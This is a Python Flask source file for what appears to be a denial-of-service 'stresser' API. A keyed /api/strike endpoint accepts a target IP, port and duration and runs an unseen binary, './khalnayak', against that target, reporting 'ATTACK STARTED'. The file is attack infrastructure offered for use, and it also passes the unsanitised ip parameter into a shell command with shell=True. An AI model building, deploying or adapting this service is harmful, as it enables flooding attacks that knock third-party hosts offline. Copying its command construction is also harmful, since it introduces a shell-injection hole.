import os
import subprocess
import threading
from flask import Flask, request, jsonify
import signal

app = Flask(__name__)

API_KEY = os.environ.get('API_KEY', 'BHAG_BHOSDIKE_2024')
attack_count = 0

def run_attack(ip, port, duration):
    global attack_count
    attack_count += 1
    print(f"[ATTACK #{attack_count}] {ip}:{port} for {duration}s")
    
    try:
        cmd = f"./khalnayak {ip} {port} {duration}"
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(f"[ERROR] {e}")

@app.route('/')
def home():
    return jsonify({"status": "DRX API RUNNING", "mode": "DANGER"})

@app.route('/api/strike')
def strike():
    key = request.args.get('key')
    if key != API_KEY:
        return jsonify({"error": "Unauthorized"}), 403
    
    ip = request.args.get('ip')
    port = request.args.get('port')
    duration = request.args.get('time', '60')
    
    if not ip or not port:
        return jsonify({"error": "Missing ip or port"}), 400
    
    if not port.isdigit() or not duration.isdigit():
        return jsonify({"error": "Invalid format"}), 400
    
    threading.Thread(target=run_attack, args=(ip, int(port), int(duration))).start()
    
    return jsonify({
        "success": True,
        "message": "ATTACK STARTED",
        "target": f"{ip}:{port}",
        "duration": duration
    })

@app.route('/api/health')
def health():
    return jsonify({"status": "alive", "attacks": attack_count})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"🔥 API Starting on port {port}")
    app.run(host='0.0.0.0', port=port)
